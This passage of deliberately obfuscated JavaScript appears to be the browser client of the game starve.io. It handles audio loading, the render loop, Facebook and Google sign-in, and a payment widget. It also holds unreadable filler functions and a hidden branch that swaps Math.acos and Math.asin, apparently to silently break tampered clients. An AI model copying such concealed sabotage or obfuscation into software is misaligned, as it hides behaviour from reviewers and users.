							var ᐃΔ = ᐃⵠⲆΔ.ΔⲆΔΔᐃ[ⵠ[500]](ⲆⲆᐃⲆ);
							ᐃⵠⲆΔ.ΔⲆΔΔᐃ[ⵠ[232]](ᐃΔ);
							ᐃⵠⲆΔ.ΔⲆΔΔᐃ["on"](ⵠ[315], (function(ᐃΔ) {
								if (!this[ⵠ[255]](ᐃΔ)) {
									console.log(ⲆⵠᐃⲆⲆ, ⵠᐃⵠⲆΔ);
									this[ⵠ[232]](ᐃΔ)
								}
							}), ᐃΔ);
							ⲆⲆⵠΔ.push(ᐃΔ)
						}
						if (ⲆⲆⵠΔ.length > ᐃⲆᐃ) ⲆⲆⵠⲆ.sample[ⲆⲆᐃⲆ] = ⲆⲆⵠΔ;
						else ⲆⲆⵠⲆ.sample[ⲆⲆᐃⲆ] = ⲆⲆⵠΔ[0];
						ⲆⲆⵠⲆ.ⵠΔⲆΔ[ⲆⲆᐃⲆ] = ᐃⵠⲆΔ.ΔⲆΔΔᐃ
					}
				}
			};
			this.ΔⵠⲆⵠⵠⲆⵠ = function(ᐃⵠⲆΔ, ᐃⲆⲆ, ΔᐃΔ) {
				for (var ⵠᐃ = 0; ᐃⵠⲆΔ.length > ⵠᐃ; ⵠᐃ++) ᐃⲆⲆ[ⵠ[ΔⲆⲆⲆΔⵠΔ]](ΔᐃΔ, ᐃⵠⲆΔ[ⵠᐃ])
			};
			this.ⵠᐃᐃⲆⵠᐃΔ = function(ΔΔᐃΔΔ, ⵠΔⲆΔ, ⵠᐃⲆⲆᐃᐃΔⵠⲆ, ⵠⵠⲆⲆΔⲆⵠⲆΔ, ᐃΔΔΔⲆ, ⲆᐃⲆⵠⲆᐃΔⵠⲆ) {
				var ᐃⵠⲆΔ = ΔΔᐃΔΔ;
				for (var ⵠᐃ = 0; ⵠᐃⲆⲆᐃᐃΔⵠⲆ > ⵠᐃ; ⵠᐃ++) {
					var ΔᐃΔΔᐃⵠΔ = ᐃⵠⲆΔ[ⵠᐃ] = [];
					for (ᐃⵠᐃⵠ = 0; ⵠⵠⲆⲆΔⲆⵠⲆΔ > ᐃⵠᐃⵠ; ᐃⵠᐃⵠ++) {
						ΔᐃΔΔᐃⵠΔ[ᐃⵠᐃⵠ] = ⲆⲆⵠⲆ.sample[ᐃΔΔΔⲆ + ᐃⵠᐃⵠ][ⵠᐃ];
						ⵠΔⲆΔ.ΔⲆΔΔᐃ[ⵠ[255]](ⲆᐃⲆⵠⲆᐃΔⵠⲆ, ΔᐃΔΔᐃⵠΔ[ᐃⵠᐃⵠ])
					}
				}
			};
			this.ⲆⲆⲆΔⵠ = function() {
				ⲆⲆⵠⲆ.ⵠᐃᐃᐃΔⲆᐃⲆΔ();
				ⲆⲆⵠⲆ.ΔΔᐃΔΔ.ᐃΔᐃᐃⵠⲆΔ = [];
				ⲆⲆⵠⲆ.ΔΔᐃΔΔ.ⲆᐃΔᐃΔ = [];
				ⲆⲆⵠⲆ.ΔΔᐃΔΔ.ᐃⲆⲆⲆⵠ = [];
				ⲆⲆⵠⲆ.ⵠᐃᐃⲆⵠᐃΔ(ⲆⲆⵠⲆ.ΔΔᐃΔΔ.ᐃΔᐃᐃⵠⲆΔ, ᐃΔⵠΔⲆ.ΔⵠⵠΔΔⲆΔ, ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ, 3, "p", .15);
				ⲆⲆⵠⲆ.ⵠᐃᐃⲆⵠᐃΔ(ⲆⲆⵠⲆ.ΔΔᐃΔΔ.ⲆᐃΔᐃΔ, ᐃΔⵠΔⲆ.ⲆⲆⵠΔⲆⲆᐃ, ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ, 4, "w", .15);
				ⲆⲆⵠⲆ.ⵠᐃᐃⲆⵠᐃΔ(ⲆⲆⵠⲆ.ΔΔᐃΔΔ.ᐃⲆⲆⲆⵠ, ᐃΔⵠΔⲆ.ᐃΔᐃⲆⲆΔΔ, ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ, ⲆΔⵠⵠ, "d", .09);
				ⲆⲆⵠⲆ.ΔⵠⲆⵠⵠⲆⵠ(ⲆⲆⵠⲆ.sample.ΔⲆⲆⲆᐃ, ⲆⲆⵠⲆ.ⵠΔⲆΔ.ΔⲆⲆⲆᐃ, .15);
				ⲆⲆⵠⲆ.ΔⵠⲆⵠⵠⲆⵠ(ⲆⲆⵠⲆ.sample.ⵠⲆᐃᐃⲆΔⵠ, ⲆⲆⵠⲆ.ⵠΔⲆΔ.ⵠⲆᐃᐃⲆΔⵠ, .2);
				ⲆⲆⵠⲆ.ΔⵠⲆⵠⵠⲆⵠ(ⲆⲆⵠⲆ.sample.ⵠᐃⲆΔⵠⵠᐃ, ⲆⲆⵠⲆ.ⵠΔⲆΔ.ⵠᐃⲆΔⵠⵠᐃ, ⵠΔᐃ);
				ⲆⲆⵠⲆ.ᐃᐃⵠⲆⲆ.ⵠᐃᐃΔⲆΔᐃΔⲆ = new ⲆᐃᐃΔⲆⲆᐃ(ᐃⲆΔᐃ.ⲆⲆⲆⵠᐃᐃⵠΔⲆ, this.sample.ΔⲆⵠⵠⲆⵠΔ, this.sample.ⵠⲆⲆᐃΔᐃᐃ, ᐃⲆΔᐃ.ⲆᐃᐃⵠᐃⲆⲆΔⲆ, .05, .4, ᐃΔⵠΔⲆ.ΔⵠΔᐃΔⵠⵠ.ΔⲆΔΔᐃ, ᐃⲆΔᐃ.ⵠΔⲆⵠΔⲆⵠ, {
					x: Ⲇ.ΔⵠⵠᐃⵠⲆᐃ,
					y: Ⲇ.ⲆⲆΔΔᐃⲆΔ,
					w: ⲆⲆⲆ.w,
					"ⵠⵠᐃ": ⲆⲆⲆ.ⵠⵠᐃ
				}, {
					x: Ⲇ.ΔⵠⵠᐃⵠⲆᐃ - 2300,
					y: Ⲇ.ⲆⲆΔΔᐃⲆΔ - 4e3,
					w: ⲆⲆⲆ.w,
					"ⵠⵠᐃ": ⲆⲆⲆ.ⵠⵠᐃ
				}, {
					x: Ⲇ.ΔⵠⵠᐃⵠⲆᐃ - 1500,
					y: Ⲇ.ⲆⲆΔΔᐃⲆΔ - 2e3,
					w: ⲆⲆⲆ.w,
					"ⵠⵠᐃ": ⲆⲆⲆ.ⵠⵠᐃ
				});
				ⲆⲆⵠⲆ.ᐃᐃⵠⲆⲆ.ⵠΔⵠᐃΔⵠᐃΔΔ = new ⲆᐃᐃΔⲆⲆᐃ(ᐃⲆΔᐃ.ⵠⲆⲆⲆᐃⵠᐃ, this.sample.ⵠᐃⲆⲆⲆⲆⵠ, this.sample.ΔΔΔⲆⲆⵠᐃ, ᐃⲆΔᐃ.ΔΔΔΔⵠᐃⲆⲆⵠ, .03, .25, ᐃΔⵠΔⲆ.ΔⵠΔᐃΔⵠⵠ.ΔⲆΔΔᐃ, ᐃⲆΔᐃ.ⵠΔⲆⵠΔⲆⵠ, {
					x: 0,
					y: Ⲇ.ⲆⲆΔΔᐃⲆΔ + 800,
					w: Ⲇ.ΔⵠⵠᐃⵠⲆᐃ - 2300,
					"ⵠⵠᐃ": ⲆⲆⲆ.ⵠⵠᐃ
				}, {
					x: -ⵠⵠΔᐃᐃ,
					y: Ⲇ.ⲆⲆΔΔᐃⲆΔ - 300,
					w: Ⲇ.ΔⵠⵠᐃⵠⲆᐃ - ⲆᐃⵠΔΔⲆⲆ,
					"ⵠⵠᐃ": ⲆⲆⲆ.ⵠⵠᐃ
				}, {
					x: -100,
					y: Ⲇ.ⲆⲆΔΔᐃⲆΔ + 400,
					w: Ⲇ.ΔⵠⵠᐃⵠⲆᐃ - 1400,
					"ⵠⵠᐃ": ⲆⲆⲆ.ⵠⵠᐃ
				});
				ⲆⲆⵠⲆ.ᐃᐃⵠⲆⲆ.ᐃΔΔΔⵠΔᐃ = new ⲆᐃᐃΔⲆⲆᐃ(ᐃⲆΔᐃ.ⵠⲆⲆⲆᐃⵠᐃ, this.sample.ⲆΔΔΔΔⵠΔ, this.sample.ⵠΔⵠⲆⲆΔⵠ, ᐃⲆΔᐃ.ΔⲆᐃⲆⵠⲆᐃⲆⵠ, .01, .22, ᐃΔⵠΔⲆ.ΔⵠΔᐃΔⵠⵠ.ΔⲆΔΔᐃ, ᐃⲆΔᐃ.ⵠΔⲆⵠΔⲆⵠ, {
					x: -ᐃᐃⲆⲆⲆⲆⲆ,
					y: -100,
					w: ⲆⲆⲆ.w + 200,
					"ⵠⵠᐃ": Ⲇ.ⲆⲆΔΔᐃⲆΔ - 1e3
				}, {
					x: -ΔᐃⲆⲆⲆ,
					y: -100,
					w: ⲆⲆⲆ.w + 200,
					"ⵠⵠᐃ": Ⲇ.ⲆⲆΔΔᐃⲆΔ + 600
				}, {
					x: -ᐃᐃᐃⵠⵠⲆⵠ,
					y: -ᐃᐃᐃⲆⲆᐃⲆ,
					w: ⲆⲆⲆ.w + 200,
					"ⵠⵠᐃ": Ⲇ.ⲆⲆΔΔᐃⲆΔ + ΔΔⲆⵠΔⲆⵠ
				});
				for (var ⵠᐃ = ⲆΔⵠ; ⵠᐃ < ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ; ⵠᐃ++) ⲆⲆⵠⲆ.ᐃᐃᐃⵠ[ⵠᐃ] = new ⵠΔⵠΔⵠⵠⲆᐃⵠ(ⵠᐃ);
				ⲆⲆⵠⲆ.ᐃᐃᐃⵠ[Δᐃᐃᐃ].ⲆⲆⲆΔⵠ(ᐃᐃΔ.ⲆᐃΔΔ);
				ⲆⲆⵠⲆ.loaded = ᐃΔᐃⲆ
			};
			this.ᐃΔΔΔⲆΔⵠⵠΔ = function() {
				if (!this.transition && ⲆⲆⲆ.ⲆΔΔΔⵠ.now < ᐃⲆΔᐃ.ᐃⲆΔΔᐃⲆΔ) this.transition = ⵠΔᐃ
			};
			this.ⵠΔΔΔᐃ = function() {
				if (!this.ⲆΔΔᐃⵠ || !this.loaded) return;
				for (var ᐃⵠⲆΔ in ⲆⲆⵠⲆ.sample) {
					var ΔⲆΔΔᐃ = ⲆⲆⵠⲆ.sample[ᐃⵠⲆΔ];
					if (typeof ΔⲆΔΔᐃ === ⵠ[186]) {
						for (var ⵠᐃ = ⵠⲆᐃⵠ; ⵠᐃ < ΔⲆΔΔᐃ.length; ⵠᐃ++) ⲆⲆⵠⲆ.ⵠΔⲆΔ[ᐃⵠⲆΔ][ⵠ[232]](ΔⲆΔΔᐃ[ⵠᐃ])
					} else ⲆⲆⵠⲆ.ⵠΔⲆΔ[ᐃⵠⲆΔ][ⵠ[232]](ΔⲆΔΔᐃ)
				}
				for (var ⵠᐃ = 0; ⵠᐃ < ⲆⲆⵠⲆ.ᐃᐃᐃⵠ.length; ⵠᐃ++) ⲆⲆⵠⲆ.ᐃᐃᐃⵠ[ⵠᐃ].ⵠⲆΔⵠΔᐃΔ()
			};
			this.select = function() {
				if (!ⲆⲆⵠⲆ.ⲆΔΔᐃⵠ) {
					!ⲆⲆⵠⲆ.loaded && ⲆⲆⵠⲆ.ⲆⲆⲆΔⵠ();
					ⲆⲆⵠⲆ.ᐃᐃᐃⵠ[ΔⲆⵠⲆ].ⲆᐃΔΔ = ᐃᐃΔ.ⲆᐃΔΔ;
					ⲆⲆⵠⲆ.ᐃᐃᐃⵠ[ᐃΔΔ].ⲆⲆⲆΔⵠⲆⵠ = ᐃⵠΔ;
					ⲆⲆⵠⲆ.ᐃΔΔΔⲆΔⵠⵠΔ()
				} else ⲆⲆⵠⲆ.ⵠΔΔΔᐃ();
				ⲆⲆⵠⲆ.ⲆΔΔᐃⵠ = !ⲆⲆⵠⲆ.ⲆΔΔᐃⵠ
			}
		};

		function ΔⵠᐃᐃᐃΔⵠⵠⵠ(ⲆⲆΔΔⲆΔⲆ, ΔⵠᐃᐃⲆⲆᐃ, ⵠΔᐃΔᐃⵠⵠ) {
			const ⵠᐃᐃⵠⲆᐃⵠ = 61252 ^ ⲆⲆΔΔⲆΔⲆ;
			const ᐃⵠⵠⵠⵠᐃⵠ = (16 << (ΔⵠᐃᐃⲆⲆᐃ >> 16 & 255)) + (24 << (ΔⵠᐃᐃⲆⲆᐃ >> 0 & 255)) + (8 << (ΔⵠᐃᐃⲆⲆᐃ >> 24 & 255)) + (0 << (ΔⵠᐃᐃⲆⲆᐃ >> 8 & 255));
			const ᐃⲆⵠⲆΔⲆΔ = (25623 | ⵠΔᐃΔᐃⵠⵠ) & ~(25623 & ⵠΔᐃΔᐃⵠⵠ);
			const ⵠⲆⲆΔᐃΔᐃᐃⲆ = ⲆᐃⲆⲆⲆΔΔ(ⵠᐃᐃⵠⲆᐃⵠ, ᐃⵠⵠⵠⵠᐃⵠ, ᐃⲆⵠⲆΔⲆΔ, ⵠᐃᐃⵠⲆᐃⵠ, ᐃⵠⵠⵠⵠᐃⵠ);
			const ᐃΔΔᐃⲆⵠⲆΔᐃ = ⲆⲆⲆⵠⲆⲆⲆ(ᐃⲆⵠⲆΔⲆΔ, ⵠᐃᐃⵠⲆᐃⵠ, ᐃⵠⵠⵠⵠᐃⵠ);
			const ΔᐃⲆⵠⵠᐃⲆᐃΔ = (2147483629 * ((ⵠⲆⲆΔᐃΔᐃᐃⲆ ^ ᐃΔΔᐃⲆⵠⲆΔᐃ) + 28682) + 2147483587) % 2147483647;
			return ΔᐃⲆⵠⵠᐃⲆᐃΔ
		}

		function ᐃⵠΔᐃⲆⵠⲆᐃⵠ(ᐃΔΔⲆⲆ) {
			return ᐃⵠΔⲆⲆΔⵠΔⵠ(ᐃΔΔⲆⲆ, 45626, 60436, 42816, 64717, 979)
		}
		ⲆᐃΔⵠⲆᐃⵠ = 0;
		document[ΔᐃⲆⵠⲆⵠΔ[68]]("version")[ΔᐃⲆⵠⲆⵠΔ[290]] = "" + ᐃⲆⵠᐃᐃ.ⵠΔⲆⲆΔⵠᐃ + ".3";
		var ΔⲆΔⵠⲆ = [];
		var ΔⵠⵠᐃΔ = {
			time: Math.floor(Math.random() * Ⲇᐃᐃⵠ),
			items: []
		};
		ΔⵠᐃⲆᐃᐃΔᐃⲆ();
		var ΔⵠⲆᐃ = new ᐃΔᐃᐃⲆΔⵠⲆⲆ;
		window.client = ΔⵠⲆᐃ;
		var ⵠⲆᐃΔ;
		var ΔⵠⵠⲆ = {
			"ⲆΔⲆᐃⵠ": ᐃᐃΔᐃΔ
		};
		var ⲆⲆⲆ;
		var ᐃᐃΔ;
		var ᐃΔⵠⲆⲆΔᐃ;
		var ⲆⲆⵠⲆ = new ΔᐃⲆⲆⵠΔⲆᐃΔ;
		var ΔⵠⵠΔΔ = new ΔⵠᐃᐃⵠᐃΔ;
		window.keyboard = ΔⵠⵠΔΔ;
		var ⲆⲆⵠⵠ = new ᐃΔⵠᐃᐃᐃⲆ;
		var ᐃⵠᐃᐃ = Δᐃᐃⵠ,
			ᐃⲆⵠⵠΔ = ᐃⵠⲆⵠ;
		var ᐃΔᐃⲆᐃᐃⵠⵠⵠ = {
			"ΔⲆΔⲆΔ": 0,
			"ΔΔⵠΔⲆⵠΔⲆⵠ": 60,
			"ᐃᐃⲆΔⵠⵠΔⲆⵠ": 0,
			display: true,
			"ᐃⵠ": false
		};
		var ΔΔΔΔⵠⲆΔ = new ⲆⲆⲆⵠⵠᐃΔΔⵠ(Ⲇⵠ, Δ, (function() {
			ᐃΔΔᐃⲆⲆⵠⵠᐃ();
			ΔⵠⵠⲆ = new ᐃⵠⵠⲆⲆⵠⲆⵠⲆ(Ⲇⵠ, Δ);
			ⵠⲆᐃΔ = new ᐃⵠⲆΔⲆⵠⵠᐃΔ(Ⲇⵠ, Δ);
			ⵠⲆᐃΔ.ΔⵠⵠΔΔΔΔⲆⵠ();
			ᐃΔⵠⲆⲆΔᐃ = new ⵠⵠΔⲆⵠⵠⵠᐃⵠ(Ⲇⵠ, Δ);
			ⲆⲆⲆ = new ⵠᐃΔΔᐃⲆⵠᐃᐃ;
			window.world = ⲆⲆⲆ;
			ᐃᐃΔ = new ᐃⲆΔᐃⲆΔΔⵠᐃ;
			window.user = ᐃᐃΔ;
			ΔΔΔΔⵠⲆΔ.ⵠΔΔΔᐃ((function() {
				ΔΔΔΔⵠⲆΔ.ᐃⲆΔΔᐃΔᐃ.style.display = ⵠ[465];
				ⵠⲆᐃΔ.ⲆΔΔᐃⵠ()
			}))
		}));

		function ΔᐃΔⵠ(ⲆΔᐃⵠΔΔⵠ) {
			ᐃⲆᐃΔᐃⵠᐃ.requestAnimationFrame(ΔᐃΔⵠ);
			ᐃⵠᐃᐃ = (ⲆΔᐃⵠΔΔⵠ - ᐃⲆⵠⵠΔ) / 1e3;
			ᐃⲆⵠⵠΔ = ⲆΔᐃⵠΔΔⵠ;
			ᐃⵠᐃᐃ = 1 < ᐃⵠᐃᐃ ? ⵠΔⲆ : ᐃⵠᐃᐃ;
			if (ΔⵠⵠⲆ.ⲆΔⲆᐃⵠ) {
				ΔⵠⵠⲆ.ΔᐃΔⵠ()
			} else {
				Δ.clearRect(ⲆΔⵠ, ΔⲆⵠⲆ, ΔΔΔᐃ, ⵠⲆᐃⲆ);
				if (ΔΔΔΔⵠⲆΔ.ⲆΔⲆᐃⵠ) ΔΔΔΔⵠⲆΔ.ΔᐃΔⵠ();
				else if (ⵠⲆᐃΔ.ⲆΔⲆᐃⵠ) ⵠⲆᐃΔ.ΔᐃΔⵠ();
				else ᐃΔⵠⲆⲆΔᐃ.ⲆΔⲆᐃⵠ && ᐃΔⵠⲆⲆΔᐃ.ΔᐃΔⵠ()
			}
		}
		ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[96]] = function() {
			if (ΔⵠⵠⲆ.ⲆΔⲆᐃⵠ) return "Are you sure you want quit starve.io ;-; ?"
		};
		ⲆⲆΔⲆⲆⵠᐃ();
		ΔᐃΔⵠ(ΔΔⵠⵠ);

		function ᐃᐃᐃⵠⵠΔⲆΔⲆ(ⵠⲆⵠΔⲆ, ⲆᐃⲆᐃᐃⲆᐃ, ⵠⲆⵠⲆⵠΔⵠ, ᐃᐃⲆⵠⵠⵠⲆ, ΔⲆⲆΔΔⵠᐃ) {
			const ⵠᐃᐃᐃⵠΔⵠ = (24 << (ⵠⲆⵠΔⲆ >> 8 & ⲆⵠⵠⵠⲆⲆⲆ)) + (0 << (ⵠⲆⵠΔⲆ >> 16 & 255)) + (16 << (ⵠⲆⵠΔⲆ >> 24 & 255)) + (8 << (ⵠⲆⵠΔⲆ >> 0 & ΔⲆⲆⲆΔⵠΔ));
			const ⲆⵠⵠΔΔΔΔ = ~(ⲆᐃⲆᐃᐃⲆᐃ & 25097) & ⲆᐃⲆᐃᐃⲆᐃ | ~(ⲆᐃⲆᐃᐃⲆᐃ & 25097) & 25097;
			const ⲆΔⵠⵠⵠΔⲆ = ⵠⲆⵠⲆⵠΔⵠ ^ 13239;
			const ΔΔⵠⲆⵠⵠⲆ = ~(52759 & ᐃᐃⲆⵠⵠⵠⲆ) & (52759 | ᐃᐃⲆⵠⵠⵠⲆ);
			const ⵠᐃΔΔⵠⵠⲆΔⲆ = ~(ΔⲆⲆΔΔⵠᐃ & 21370) & (ΔⲆⲆΔΔⵠᐃ | 21370);
			const ᐃⲆΔⲆΔΔᐃⵠⲆ = ᐃⲆⲆⲆΔΔⲆⵠᐃ(ⵠᐃᐃᐃⵠΔⵠ, ⲆⵠⵠΔΔΔΔ, ⲆΔⵠⵠⵠΔⲆ, ΔΔⵠⲆⵠⵠⲆ, ⵠᐃΔΔⵠⵠⲆΔⲆ, ⵠᐃᐃᐃⵠΔⵠ);
			const ⲆⲆⲆΔⵠⵠΔⲆⵠ = ⲆΔΔⵠΔⲆΔ(ⲆⵠⵠΔΔΔΔ, ⲆΔⵠⵠⵠΔⲆ, ΔΔⵠⲆⵠⵠⲆ);
			const ⲆⵠⲆᐃⵠⲆⵠΔⵠ = (1664525 * ((ᐃⲆΔⲆΔΔᐃⵠⲆ ^ ⲆⲆⲆΔⵠⵠΔⲆⵠ) + 10340) + 1013904223) % 4294967296;
			return ⲆⵠⲆᐃⵠⲆⵠΔⵠ
		}

		function ⲆⲆΔⵠⲆᐃΔΔᐃ(ⵠⵠΔΔΔ, ΔⵠⲆⵠΔᐃⲆ, ⲆᐃΔΔⲆΔΔ, ΔⲆⲆⵠⵠᐃⵠ, ⵠⲆᐃⵠⲆΔΔ) {
			const ⵠⵠΔᐃᐃᐃΔ = ~(1899 & ⵠⵠΔΔΔ) & 1899 | ~(1899 & ⵠⵠΔΔΔ) & ⵠⵠΔΔΔ;
			const ⲆΔⲆⵠᐃⲆΔ = 21869 ^ ΔⵠⲆⵠΔᐃⲆ;
			const ᐃᐃᐃΔᐃᐃΔⵠⲆ = ((34535 + ⲆᐃΔΔⲆΔΔ) * 2147483629 + 2147483587) % 2147483647;
			const ᐃⲆⲆᐃⵠᐃⲆᐃⵠ = ~(ΔⲆⲆⵠⵠᐃⵠ & 47650) & ΔⲆⲆⵠⵠᐃⵠ | ~(ΔⲆⲆⵠⵠᐃⵠ & 47650) & 47650;
			const ⲆⲆⵠΔΔᐃⵠΔᐃ = (ⵠⲆᐃⵠⲆΔΔ | 59392) & ~(ⵠⲆᐃⵠⲆΔΔ & 59392);
			const ΔⲆⲆΔⵠΔⵠ = ⲆᐃⲆⲆⲆΔΔ(ⵠⵠΔᐃᐃᐃΔ, ⲆΔⲆⵠᐃⲆΔ, ᐃᐃᐃΔᐃᐃΔⵠⲆ, ᐃⲆⲆᐃⵠᐃⲆᐃⵠ, ⲆⲆⵠΔΔᐃⵠΔᐃ);
			const ᐃⵠᐃᐃⵠΔΔⲆᐃ = ⵠⲆᐃⲆᐃΔΔ(ⵠⵠΔᐃᐃᐃΔ, ⲆΔⲆⵠᐃⲆΔ);
			const ᐃΔΔΔⲆⵠⲆⵠΔ = ~(12429 & ΔⲆⲆΔⵠΔⵠ) & (ΔⲆⲆΔⵠΔⵠ | 12429);
			return ᐃΔΔΔⲆⵠⲆⵠΔ
		}

		function ᐃⲆⵠᐃΔⵠⵠ() {}
		var ⵠᐃⲆⵠⲆΔᐃ = 0;

		function check_ads() {}
		var ⲆᐃⵠᐃᐃⲆΔ = new XMLHttpRequest;
		ⲆᐃⵠᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[199]] = function() {
			if (4 === this[ΔᐃⲆⵠⲆⵠΔ[41]] && 0 === this.status) {}
		};

		function ΔᐃⲆⲆΔΔΔᐃⵠ(ΔⵠⲆᐃⵠⵠᐃ, ⵠΔᐃᐃΔᐃⲆ, ᐃⵠⲆΔⲆᐃⵠ, ⲆᐃⲆⵠᐃᐃᐃ) {
			const ⲆΔⲆⵠᐃΔⵠ = ~(16617 & ΔⵠⲆᐃⵠⵠᐃ) & (16617 | ΔⵠⲆᐃⵠⵠᐃ);
			const ΔⲆⵠΔⲆΔⲆ = (2147483587 + 2147483629 * (12681 + ⵠΔᐃᐃΔᐃⲆ)) % 2147483647;
			const ⵠⵠᐃΔᐃΔΔ = ~(17554 & ᐃⵠⲆΔⲆᐃⵠ) & (ᐃⵠⲆΔⲆᐃⵠ | 17554);
			const ΔⵠⲆⵠᐃᐃⵠ = (2147483629 * (24713 + ⲆᐃⲆⵠᐃᐃᐃ) + 2147483587) % 2147483647;
			const ᐃᐃⲆᐃⵠⲆⵠΔᐃ = ⲆΔᐃⵠⲆⵠⵠ(ⲆΔⲆⵠᐃΔⵠ, ΔⲆⵠΔⲆΔⲆ, ⵠⵠᐃΔᐃΔΔ, ΔⵠⲆⵠᐃᐃⵠ, ⲆΔⲆⵠᐃΔⵠ, ΔⲆⵠΔⲆΔⲆ);
			const ΔΔᐃⵠⵠΔΔⲆᐃ = ⲆΔᐃⵠⲆⵠⵠ(ⵠⵠᐃΔᐃΔΔ, ΔⵠⲆⵠᐃᐃⵠ, ⲆΔⲆⵠᐃΔⵠ, ΔⲆⵠΔⲆΔⲆ, ⵠⵠᐃΔᐃΔΔ, ΔⵠⲆⵠᐃᐃⵠ);
			const ᐃⵠⲆⲆΔⲆⲆⵠⲆ = 49513 ^ ᐃᐃⲆᐃⵠⲆⵠΔᐃ;
			return ᐃⵠⲆⲆΔⲆⲆⵠⲆ
		}
		var Ⲇᐃᐃⵠᐃ = "https://token.starve.io/";
		var ᐃⵠᐃΔⲆ = "https://token2.starve.io/";
		var ᐃᐃⵠⲆᐃⲆⵠ = ⵠⲆⲆ;
		var ⵠⲆⲆⲆⵠΔⵠ = 1;
		var ⲆᐃⵠⲆᐃᐃᐃⲆⵠ = 4;
		var ⵠⲆᐃΔⲆΔΔ = undefined;
		var ⵠⵠΔΔⵠ = ΔΔⵠᐃΔ;
		var ΔⵠΔⲆᐃ = ⲆΔᐃᐃᐃ;
		var ⲆⵠⵠᐃⲆΔⵠΔⲆ = ᐃⵠᐃⵠᐃ;
		var ΔⵠⲆᐃΔⵠⲆ = ᐃⵠΔ;
		ᐃⲆᐃΔᐃⵠᐃ.ⵠⲆⵠⲆᐃΔᐃ = function() {
			ΔⵠⲆᐃΔⵠⲆ = 1
		};

		function ᐃⵠⵠᐃΔΔⲆΔⵠ() {
			if (ΔΔⵠΔᐃ) {
				ⵠⵠΔΔⵠ = ΔΔⲆᐃ.ᐃⵠⲆᐃⲆⵠΔ(40);
				ⵠⲆᐃΔⲆΔΔ = ⲆᐃⵠⲆᐃᐃᐃⲆⵠ;
				ΔⵠΔⲆᐃ = ΔΔⵠΔᐃ["userId"];
				ᐃⲆᐃΔᐃⵠᐃ.ⵠⲆⵠⲆᐃΔᐃ();
				return
			}
			ᐃⲆᐃΔᐃⵠᐃ[ⵠ[515]][ⵠ[386]]["getAuthInstance"]()["signIn"]()
		}
		var ⵠΔⲆᐃᐃᐃⲆⲆᐃ = ⵠᐃⵠⲆΔ;
		var ⲆΔⲆⵠⲆΔⵠ = {
			"ⲆⲆⲆΔⲆⵠⵠᐃᐃ": "ACCESS_TOKEN"
		};
		var ᐃⵠⲆΔ = document[ΔᐃⲆⵠⲆⵠΔ[224]]("script");
		ᐃⵠⲆΔ["type"] = "text/javascript";
		ᐃⵠⲆΔ["async"] = ᐃⲆᐃᐃⲆ;
		ᐃⵠⲆΔ["src"] = "https://static.xsolla.com/embed/paystation/1.0.7/widget.min.js";
		ᐃⵠⲆΔ["addEventListener"]("load", (function(ⵠΔⵠⵠ) {
			ᐃⲆᐃΔᐃⵠᐃ[ⵠ[401]][ⵠ[139]](ⲆΔⲆⵠⲆΔⵠ);
			ᐃⲆᐃΔᐃⵠᐃ[ⵠ[401]]["on"]("status-done", ΔᐃⲆⵠΔΔⲆΔᐃ)
		}), false);
		var ᐃᐃⲆᐃⲆⵠΔΔⵠ = document.getElementsByTagName("head")[ᐃΔΔ];
		ᐃᐃⲆᐃⲆⵠΔΔⵠ[ΔᐃⲆⵠⲆⵠΔ[242]](ᐃⵠⲆΔ);
		ᐃⲆᐃΔᐃⵠᐃ["fbAsyncInit"] = function() {
			ᐃⵠΔⲆⲆΔΔ();
			console.log(undefined)
		};
		(function(Δⵠⵠᐃ, ᐃⵠⲆΔ, ᐃΔ) {
			var ΔⲆΔⲆ, ΔΔΔⲆΔⲆΔ = Δⵠⵠᐃ.getElementsByTagName(ᐃⵠⲆΔ)[0];
			if (Δⵠⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[68]](ᐃΔ)) {
				return
			}
			ΔⲆΔⲆ = Δⵠⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[224]](ᐃⵠⲆΔ);
			ΔⲆΔⲆ.id = ᐃΔ;
			ΔⲆΔⲆ.src = "https://connect.facebook.net/en_US/sdk.js";
			ΔΔΔⲆΔⲆΔ.parentNode.insertBefore(ΔⲆΔⲆ, ΔΔΔⲆΔⲆΔ)
		})(document, "script", "facebook-jssdk");
		if (ᐃⲆᐃΔᐃⵠᐃ.ᐃᐃⲆΔⵠᐃⵠⵠⵠ) {
			var ΔΔΔⵠᐃᐃⵠⲆΔ = ᐃⲆᐃΔᐃⵠᐃ["Math"].acos;
			ᐃⲆᐃΔᐃⵠᐃ["Math"].acos = ᐃⲆᐃΔᐃⵠᐃ["Math"].asin;
			ᐃⲆᐃΔᐃⵠᐃ["Math"].asin = ΔΔΔⵠᐃᐃⵠⲆΔ;
			var ⲆΔⲆΔⵠⲆⵠⲆⲆ = ᐃⲆᐃΔᐃⵠᐃ["Math"].acos;
			ᐃⲆᐃΔᐃⵠᐃ["Math"].acos = ᐃⲆᐃΔᐃⵠᐃ["Math"].asin;
			ᐃⲆᐃΔᐃⵠᐃ["Math"].asin = ⲆΔⲆΔⵠⲆⵠⲆⲆ
		}

		function ⲆⵠᐃⵠⲆⲆⲆⲆᐃ() {
			ᐃⲆᐃΔᐃⵠᐃ[ⵠ[258]]["login"]((function(ⲆᐃⲆᐃⵠⲆⵠ) {
				if (ⲆᐃⲆᐃⵠⲆⵠ["authResponse"]) {
					ᐃⲆᐃΔᐃⵠᐃ[ⵠ[258]]["api"]("/me", (function(ⲆᐃⲆᐃⵠⲆⵠ) {
						ⵠⲆᐃΔⲆΔΔ = ⵠⲆⲆⲆⵠΔⵠ;
						ⵠⵠΔΔⵠ = ᐃⲆᐃΔᐃⵠᐃ[ⵠ[258]][ⵠ[ΔΔΔΔΔ]]()["accessToken"];
						ᐃⵠΔⲆⲆΔΔ();
						ᐃⲆᐃΔᐃⵠᐃ.ⵠⲆⵠⲆᐃΔᐃ()
					}))
				} else {}
			}))
		}
		var ⵠᐃᐃⵠⵠⵠⲆ = undefined;
		var Ⲇᐃⵠᐃⵠ = undefined;
		var ΔⵠΔⲆᐃⵠⵠⵠⲆ = function() {
			ᐃⲆᐃΔᐃⵠᐃ[ⵠ[515]]["load"](ⵠ[386], ᐃⲆⵠⲆΔᐃΔΔᐃ)
		};
